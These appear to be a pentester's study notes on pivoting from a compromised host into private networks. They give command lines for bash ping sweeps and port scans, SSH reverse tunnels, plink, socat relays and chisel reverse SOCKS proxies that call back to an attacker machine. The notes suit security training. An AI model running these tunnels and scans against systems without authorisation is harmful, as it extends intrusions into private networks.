Pivoting allows accessing private network assets from a compromised public facing host
such as exploring the network behing a NAT

Pivoting can work via port forwarding
    single port on compromised machine to single port on another host
    such as with using iptables
pivoting can also work with tunnelling/proxying, routing all desired traffic into the compromised host
    proxying can be tunneled inside another protocol, such as SSH for firewall evasion


A proxy is good if we want to redirect lots of different kinds of traffic into our target network
-- for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.


meterpreter         - portfwd


===================================
native bash

ping sweep with bash script. parallel for speed.
might give false negatives if icmp is blocked. might be worth checking other ports with netcat for example
if you suspect a host is up (80, 443, 22)

    for i in {1..254}; do
        (ping -c 1 10.200.100.${i} | grep "bytes from" &)
    done


port scan sweep in bash
this will take a long time

for i in {1..65535}; do
    (echo > /dev/tcp/192.168.1.1/$i) > /dev/null 2>&1 && echo $i is open;
done


===================================
proxychains

reads configurationfile ./proxychains.conf, ~/.proxychains/proxychains.conf, /etc/proxychains.conf
prepend to command to route all traffic through the proxy


===================================
SSH tunnels/proxies

Allow forward (bind) and reverse tunnels, so they can set up both port forwarding as well as proxies!

Link Ports
    ssh -L <localport>:<targetip>:<targetport> <user>@<host> -fN

    any traffic to localhost:localport will now go to targetip:targetport through host.
    -f:     background the shell, so we get the terminal back
    -N:     don't actually run a session, just make the connection

Proxying:
    ssh -D <port> <user>@<host> -fN

    sets up a proxy on the target on the specified port
    can then use proxychains or similar to go through


Reverse Links (port forward)
    Create new ssh key pair
    ssh-keygen

    add public key to authorized.keys like so
    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAAAB3NzaC[...]

    transfer the PRIVATE key to the pivot machine (make sure it's the throwaway one)
    make it 600
    then run the ssh command with the -R flag for port forwarding

    ssh -i <throwaway_privatekey> -R <localport>:<targetip>:<targetport> <localuser>@<localhost> -fN

    when done make sure to delete the private key from the target and remove from authorized_keys file

Closing connections:
    ps aux | grep ssh
    kill <pid>

================================
plink.exe

ssh replacement, putty
uses putty style keys instead of ssh style keys
use putty-tools / puttygen to convert the private key to putty format.
public key authorization

use this to upload ssh server binaries to windows machines.

cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

echo y sends a 'yes' for connecting to an unknown host when executing this command

================================
socat

creates a link between two addresses like a portal gun
socat can port forward or act as a proxy
socat can also encrypt a connection

reverse port forward (relay)
    socat tcp-l:<port> tcp:<attacker>:<attackerport>
    first opens a listening socket for incomming traffic on port and redir
    then connects to attacker on the given port when a packet arrives
    any traffic going into that listening port will then be redirected to the attacker
    can be backgrounded

forward port
    socat tcp-l:<port>,fork,reuseaddr tcp:<target>:<targetport>
    will relay any traffic going to port from the attacker machine to the target
    will create a listening socket on the intermediate host where socat runs

forward port - stealth
    on the attacker set up a listening port
    socat tcp-l:<port1> tcp-l:<port2>,fork,reuseaddr

    then on the intermediate machine connect to us, then forward all traffic on that port to the target
    socat tcp:<attacker>:<port1> tcp:<targetip>:<targetport>,fork

    then we can send all traffic to localhost:port1

===============================
sshuttle

create a new network interface and route traffic to it using an ssh connection
    sshuttle -r root@123.123.123.123 --ssh-cmd 'ssh -i <keyfile>' -x 123.123.123.123 123.123.123.0/24

-r <uname>@<host>:port
--ssh-cmd to define a custom ssh command. we can use this to indicate a private key file for identiy
-x exclude specific host (like the ssh target) from the domain.
    if we don't do that we get a broken pipe and the command fails
last positional parameter is the subdomain in CIDR notation that we want to reach with this new tunnel
we can use -N flag to try and guess automatically from the target's routing table, but that's not reliable

===============================
chisel proxy

reverse socks proxy
    on attacking machine run chisel server
        chisel server -p <port> --reverse &
    on compromised host run chisel client
        chisel client <localip>:<localport> R:socks
    R stands for remotes. the server anticipates the client to be making the port forwarding or proxy
    instead of the server doing it

forward socks proxy
    run server on the compromised host
        ./chisel server -p LISTEN_PORT --socks5
    then connect to it from the attacking box
        chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
    then we can use proxy software like proxychains
    to connect to the socks5 proxy on PROXY_PORT

remote port forward
    on the attacking machine start the server
        chisel server -p LISTEN_PORT --reverse &
    on the compromised host set up the port forwarding
        ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
    anything going to the compromised host on LOCAL_PORT will end up going to TARGET_IP:TARGET_PORT

local port forward
    start the chisel server on the compromised host
        ./chisel server -p LISTEN_PORT
    connect to it from the attacking machine
        chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
    anything going to LOCAL_PORT on the local machine will end up at the target on the target port